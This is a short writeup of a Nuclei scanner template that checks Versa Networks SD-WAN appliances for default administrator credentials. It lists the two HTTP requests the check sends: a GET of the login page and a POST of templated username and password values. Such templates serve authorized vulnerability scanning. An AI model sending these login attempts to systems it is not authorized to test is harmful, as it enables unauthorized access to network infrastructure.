# Nuclei Template: Versa Networks SD-WAN Application Default Login
**Template ID:** versa-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`versa-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Versa Networks SD-WAN application default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /versa/login.html HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate

POST /versa/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{user}}&password={{pass}}&sso=systemRadio
```

## References
- https://versa-networks.com/products/sd-wan.php
